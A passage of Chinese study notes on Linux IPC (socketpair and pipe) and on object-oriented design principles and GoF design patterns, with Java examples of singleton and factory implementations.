<li>这对套接字可以用于全双工通信，每一个套接字既可以读也可以写。例如，可以往sv[0]中写，从sv[1]中读；或者从sv[1]中写，从sv[0]中读； </li>
<li>如果往一个套接字(如sv[0])中写入后，再从该套接字读时会阻塞，只能在另一个套接字中(sv[1])上读成功； </li>
<li>读、写操作可以位于同一个进程，也可以分别位于不同的进程，如父子进程。如果是父子进程时，一般会功能分离，一个进程用来读，一个用来写。因为文件描述副sv[0]和sv[1]是进程共享的，所以读的进程要关闭写描述符, 反之，写的进程关闭读描述符。</li>
</ol>
<h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe()"></a>pipe()</h3><p><a href="https://blog.csdn.net/qq_42914528/article/details/82023408">https://blog.csdn.net/qq_42914528/article/details/82023408</a></p>
<p>pipe（）创建一个管道，一个可用于进程间通信的单向数据通道。数组pipefd用于返回引用管道末端的两个文件描述符。pipefd[0]表示管道的读取端。pipefd[1]表示管道的写入端。写入管道写入端的数据由内核缓冲，直到从管道读取端读取为止。有关更多详细信息，请参阅管道（7）。</p>
<p>管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质：</p>
<ol>
<li><p>其本质是一个伪文件(实为内核缓冲区)</p>
</li>
<li><p>由两个文件描述符引用，一个表示读端，一个表示写端。</p>
</li>
<li><p>规定数据从管道的写端流入管道，从读端流出。</p>
</li>
</ol>
<p>管道的原理: 管道实为内核使用环形队列机制，借助内核缓冲区(4k)实现。</p>
<p>管道的局限性：</p>
<p>① 数据自己读不能自己写。</p>
<p>② 数据一旦被读走，便不在管道中存在，不可反复读取。</p>
<p>③ 由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。</p>
<p>④ 只能在有公共祖先的进程间使用管道。</p>
<p>常见的通信方式有，单工通信、半双工通信、全双工通信。</p>
<p>tcp协议网络数据会分包,如果没有全部到达, 内核有buffer</p>
<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a><a href="http://c.biancheng.net/view/1333.html">设计模式</a></h1><h2 id="面向对象设计原则-迪米特和依依开始k"><a href="#面向对象设计原则-迪米特和依依开始k" class="headerlink" title="面向对象设计原则(迪米特和依依开始k)"></a>面向对象设计原则(迪米特和依依开始k)</h2><ul>
<li><p><strong>开</strong>闭原则:  对扩展开放，对修改关闭; 降低维护带来的新风险</p>
</li>
<li><p>里<strong>氏</strong>替换原则: 子类可以扩展父类的功能，但不能改变父类原有的功能。也就是说：子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法。(例如几维鸟不是鸟的例子)</p>
</li>
<li><p><strong>依</strong>赖倒置原则: 高层不应该依赖低层，要面向接口编程;  更利于代码结构的升级扩展</p>
</li>
<li><p>单<strong>一</strong>职责原则: 一个类只干一件事，实现类要单一; 便于理解，提高代码的可读性</p>
</li>
<li><p>接<strong>口</strong>隔离原则: 一个接口只干一件事，接口要精简单一; 功能解耦，高聚合、低耦合</p>
</li>
<li><p>迪米特法则: 如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。</p>
</li>
<li><p>合成复用原则:  尽量使用组合或者聚合关系实现代码复用，少使用继承,如果要使用继承关系，则必须严格遵循里氏替换原则。合成复用原则同里氏替换原则相辅相成的，两者都是开闭原则的具体实现规范。 降低代码耦合.(例如汽车分类管理程序)</p>
<blockquote>
<p>通常类的复用分为继承复用和合成复用两种，继承复用虽然有简单和易实现的优点，但它也存在以下缺点。</p>
</blockquote>
</li>
</ul>
<blockquote>
<ol>
<li>继承复用破坏了类的封装性。因为继承会将父类的实现细节暴露给子类，父类对子类是透明的，所以这种复用又称为“白箱”复用。</li>
<li>子类与父类的耦合度高。父类的实现的任何改变都会导致子类的实现发生变化，这不利于类的扩展与维护。</li>
<li>它限制了复用的灵活性。从父类继承而来的实现是静态的，在编译时已经定义，所以在运行时不可能发生变化。</li>
</ol>
<p>采用组合或聚合复用时，可以将已有对象纳入新对象中，使之成为新对象的一部分，新对象可以调用已有对象的功能，它有以下优点。</p>
<ol>
<li>它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱”复用。</li>
<li>新旧类之间的耦合度低。这种复用所需的依赖较少，新对象存取成分对象的唯一方法是通过成分对象的接口。</li>
<li>复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。</li>
</ol>
</blockquote>
<ol>
<li>创建型模式：用于描述“怎样创建对象”，它的主要特点是“将对象的创建与使用分离”。GoF 中提供了单例、原型、工厂方法、抽象工厂、建造者等 5 种创建型模式。</li>
<li>结构型模式：用于描述如何将类或对象按某种布局组成更大的结构，GoF 中提供了代理、适配器、桥接、装饰、外观、享元、组合等 7 种结构型模式。</li>
<li>行为型模式：用于描述类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，以及怎样分配职责。GoF 中提供了模板方法、策略、命令、职责链、状态、观察者、中介者、迭代器、访问者、备忘录、解释器等 11 种行为型模式。</li>
</ol>
<h2 id="单例模式（Singleton-Pattern）"><a href="#单例模式（Singleton-Pattern）" class="headerlink" title="单例模式（Singleton Pattern）"></a>单例模式（Singleton Pattern）</h2><p>优:在内存中只有一个实例,减少内存的开销; 避免对资源的多重占用;</p>
<p>缺:一般没有接口,扩展困难,违背开闭原则;不利于代码调试,如果单例没有执行完,不能模拟生成一个新的对象;单例模式的功能通常写在一个类中,如果功能设计不合理,容易违背单一职责原则;</p>
<p>应用场景: </p>
<ul>
<li><p>某类只要求生成一个对象的时候,如一个班的班长,每个人的身份证号.</p>
</li>
<li><p>某些类创建实例时间较长或占用系统资源很多,且经常使用</p>
</li>
<li><p>某类需要频繁实例化,又频繁销毁,例如多线程线程池,网路连接池</p>
</li>
<li><p>频繁访问数据库或文件</p>
</li>
<li><p>对于一些控制硬件级别的操作，或者从系统上来讲应当是单一控制逻辑的操作，如果有多个实例，则系统会完全乱套。</p>
</li>
<li><p>当对象需要被共享的场合。由于单例模式只允许创建一个对象，共享该对象可以节省内存，并加快对象访问速度。如 Web 中的配置对象、数据库的连接池等。</p>
</li>
</ul>
<p>懒汉式实现:</p>
<p>该模式的特点是类加载时没有生成单例，只有当第一次调用 getlnstance 方法时才去创建这个单例。</p>
<p>必须要加volatile, 有反射,这个还是不安全的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-13 10:12 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证instance在所有线程中同步,必须加volatile</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * private避免在外部被实例化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加synchronized同步</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> LazySingleton</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-23 11:26 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 假设对象已经有了，很多人只是取实例，不应该被锁住，</span></span><br><span class="line"><span class="comment">     * 使用dcl可以解决这个问题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Double Check Lock</span></span><br><span class="line">            <span class="keyword">synchronized</span> (LazySingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                   instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>饿汉式实现:</p>
<p>该模式的特点是类一旦加载就创建一个单例，保证在调用 getInstance 方法之前单例已经存在了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-13 10:20 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HungrySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">HungrySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HungrySingleton</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">HungrySingleton</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>枚举实现:</p>
<p>枚举有个默认有参构造器, 两个参数string in</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> singletion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-27 10:09 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">EnumSingle</span> &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> EnumSingle <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">EnumSingle</span> <span class="variable">instance</span> <span class="operator">=</span> EnumSingle.INSTANCE;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Constructor&lt;EnumSingle&gt; declaredConstructor = EnumSingle.class.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">EnumSingle</span> <span class="variable">enumSingle</span> <span class="operator">=</span> declaredConstructor.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="原型模式-Prototype"><a href="#原型模式-Prototype" class="headerlink" title="原型模式(Prototype)"></a>原型模式(Prototype)</h2><p>通过拷贝原型创建新的对象,由于 Java 提供了对象的 clone() 方法，所以用 Java 实现原型模式很简单。克隆</p>
<h2 id="工厂模式-Factory-Pattern"><a href="#工厂模式-Factory-Pattern" class="headerlink" title="工厂模式(Factory Pattern)"></a>工厂模式(Factory Pattern)</h2><p>不同条件下创造不同实例. 工厂</p>
<h3 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h3><p>在简单工厂模式中创建实例的方法通常为静态（static）方法，因此简单工厂模式（Simple Factory Pattern）又叫作静态工厂方法模式（Static Factory Method Pattern）。</p>
<p>优: 客户端可以免除直接创建产品的职责,很方便的创建出相应的产品;客户端无需知道所创建的产品的类名,只需知道参数即可;也可以引入配置文件,在不修改客户端代码的情况下更换和添加产品</p>
<p>缺: </p>
<ol>
<li>简单工厂模式的工厂类单一，负责所有产品的创建，职责过重，一旦异常，整个系统将受影响。且工厂类代码会非常臃肿，违背高聚合原则。</li>
<li>使用简单工厂模式会增加系统中类的个数（引入新的工厂类），增加系统的复杂度和理解难度</li>
<li>系统扩展困难，一旦增加新产品不得不修改工厂逻辑，在产品类型较多时，可能造成逻辑过于复杂</li>
<li>简单工厂模式使用了 static 工厂方法，造成工厂角色无法形成基于继承的等级结构。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//抽象产品</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//具体产品：ProductA</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct1</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;具体产品1显示...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//具体产品：ProductB</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct2</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;具体产品2显示...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Const</span> &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_A</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_B</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_C</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SimpleFactory</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Product <span class="title function_">makeProduct</span><span class="params">(<span class="type">int</span> kind)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (kind) &#123;</span><br><span class="line">                <span class="keyword">case</span> Const.PRODUCT_A:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">                <span class="keyword">case</span> Const.PRODUCT_B:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><p>“工厂方法模式”是对简单工厂模式的进一步抽象化，其好处是可以使系统在不修改原来代码的情况下引进新的产品，即满足开闭原则。</p>
<p>满足里氏替换原则, 迪米特法则,依赖倒置原则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FactoryMethod;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Product a;</span><br><span class="line">            AbstractFactory af;</span><br><span class="line">            af = (AbstractFactory) ReadXML1.getObject();</span><br><span class="line">            a = af.newProduct();</span><br><span class="line">            a.show();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象产品：提供了产品的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体产品1：实现抽象产品中的抽象方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProduct1</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体产品1显示...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体产品2：实现抽象产品中的抽象方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProduct2</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体产品2显示...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象工厂：提供了厂品的生成方法</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体工厂1：实现了厂品的生成方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteFactory1</span> <span class="keyword">implements</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体工厂1生成--&gt;具体产品1...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体工厂2：实现了厂品的生成方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteFactory2</span> <span class="keyword">implements</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体工厂2生成--&gt;具体产品2...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FactoryMethod;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReadXML1</span> &#123;</span><br><span class="line">    <span class="comment">//该方法用于从XML配置文件中提取具体类类名，并返回一个实例对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建文档对象</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dFactory.newDocumentBuilder();</span><br><span class="line">            Document doc;</span><br><span class="line">            doc = builder.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/FactoryMethod/config1.xml&quot;</span>));</span><br><span class="line">            <span class="comment">//获取包含类名的文本节点</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">            <span class="type">Node</span> <span class="variable">classNode</span> <span class="operator">=</span> nl.item(<span class="number">0</span>).getFirstChild();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cName</span> <span class="operator">=</span> <span class="string">&quot;FactoryMethod.&quot;</span> + classNode.getNodeValue();</span><br><span class="line">            <span class="comment">//System.out.println(&quot;新类名：&quot;+cName);</span></span><br><span class="line">            <span class="comment">//通过类名生成实例对象并将其返回</span></span><br><span class="line">            Class&lt;?&gt; c = Class.forName(cName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><p>抽象工厂模式是工厂方法模式的升级版本，工厂方法模式只生产一个等级的产品，而抽象工厂模式可生产多个等级的产品。</p>
<h2 id="建造者模式-Builder-Pattern"><a href="#建造者模式-Builder-Pattern" class="headerlink" title="建造者模式(Builder Pattern)"></a>建造者模式(Builder Pattern)</h2><p>用来创建复杂的复合对象</p>
<h2 id="代理模式-Proxy-Pattern"><a href="#代理模式-Proxy-Pattern" class="headerlink" title="代理模式(Proxy Pattern)"></a>代理模式(Proxy Pattern)</h2><p>为其他对象提供一种代理以控制对这个对象的访问</p>
<h2 id="外观模式-Facade-Pattern"><a href="#外观模式-Facade-Pattern" class="headerlink" title="外观模式(Facade Pattern)"></a>外观模式(Facade Pattern)</h2><p>对外提供一个统一的接口用来访问子系统</p>
<h2 id="装饰器模式（Decorator-Pattern）"><a href="#装饰器模式（Decorator-Pattern）" class="headerlink" title="装饰器模式（Decorator Pattern）"></a>装饰器模式（Decorator Pattern）</h2><p>为对象添加新功能</p>
<h2 id="享元模式（Flyweight-Pattern）"><a href="#享元模式（Flyweight-Pattern）" class="headerlink" title="享元模式（Flyweight Pattern）"></a>享元模式（Flyweight Pattern）</h2><p>使用对象池来减少重复对象的创建</p>
<h2 id="组合模式（Composite-Pattern）"><a href="#组合模式（Composite-Pattern）" class="headerlink" title="组合模式（Composite Pattern）"></a>组合模式（Composite Pattern）</h2><p>将整体与局部（树形结构）进行递归组合，让客户端能够以一种的方式对其进行处理</p>
<h2 id="适配器模式（Adapter-Pattern）"><a href="#适配器模式（Adapter-Pattern）" class="headerlink" title="适配器模式（Adapter Pattern）"></a>适配器模式（Adapter Pattern）</h2><p>将原来不兼容的两个类融合在一起</p>
<h2 id="桥接模式（Bridge-Pattern）"><a href="#桥接模式（Bridge-Pattern）" class="headerlink" title="桥接模式（Bridge Pattern）"></a>桥接模式（Bridge Pattern）</h2><p>将两个能够独立变化的部分分离开来</p>
<h2 id="模板模式（Template-Pattern）"><a href="#模板模式（Template-Pattern）" class="headerlink" title="模板模式（Template Pattern）"></a>模板模式（Template Pattern）</h2><p>定义一套流程模板，根据需要实现模板中的操作</p>
<h2 id="策略模式（Strategy-Pattern）"><a href="#策略模式（Strategy-Pattern）" class="headerlink" title="策略模式（Strategy Pattern）"></a>策略模式（Strategy Pattern）</h2><p>封装不同的算法，算法之间能互相替换</p>
<h2 id="责任链模式（Chain-of-Responsibility-Pattern）"><a href="#责任链模式（Chain-of-Responsibility-Pattern）" class="headerlink" title="责任链模式（Chain of Responsibility Pattern）"></a>责任链模式（Chain of Responsibility Pattern）</h2><p>拦截的类都实现统一接口，每个接收者都包含对下一个接收者的引用。将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。</p>
<h2 id="迭代器模式（Iterator-Pattern）"><a href="#迭代器模式（Iterator-Pattern）" class="headerlink" title="迭代器模式（Iterator Pattern）"></a>迭代器模式（Iterator Pattern）</h2><p>提供一种方法顺序访问一个聚合对象中的各个元素</p>
<h2 id="命令模式（Command-Pattern）"><a href="#命令模式（Command-Pattern）" class="headerlink" title="命令模式（Command Pattern）"></a>命令模式（Command Pattern）</h2><p> 将请求封装成命令，并记录下来，能够撤销与重做</p>
<h2 id="状态模式（State-Pattern）"><a href="#状态模式（State-Pattern）" class="headerlink" title="状态模式（State Pattern）"></a>状态模式（State Pattern）</h2><p>根据不同的状态做出不同的行为</p>
<h2 id="备忘录模式（Memento-Pattern）"><a href="#备忘录模式（Memento-Pattern）" class="headerlink" title="备忘录模式（Memento Pattern）"></a>备忘录模式（Memento Pattern）</h2><p>保存对象的状态，在需要时进行恢复</p>
<h2 id="中介者模式（Mediator-Pattern）"><a href="#中介者模式（Mediator-Pattern）" class="headerlink" title="中介者模式（Mediator Pattern）"></a>中介者模式（Mediator Pattern）</h2><p>将对象之间的通信关联关系封装到一个中介类中单独处理，从而使其耦合松散</p>
<h2 id="解释器模式（Interpreter-Pattern）"><a href="#解释器模式（Interpreter-Pattern）" class="headerlink" title="解释器模式（Interpreter Pattern）"></a>解释器模式（Interpreter Pattern）</h2><p>给定一个语言，定义它的语法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子</p>
<h2 id="观察者模式（Observer-Pattern）"><a href="#观察者模式（Observer-Pattern）" class="headerlink" title="观察者模式（Observer Pattern）"></a>观察者模式（Observer Pattern）</h2><p>状态发生改变时通知观察者，一对多的关系</p>
<h2 id="访问者模式（Visitor-Pattern）"><a href="#访问者模式（Visitor-Pattern）" class="headerlink" title="访问者模式（Visitor Pattern）"></a>访问者模式（Visitor Pattern）</h2><p>稳定数据结构，定义新的操作行为</p>
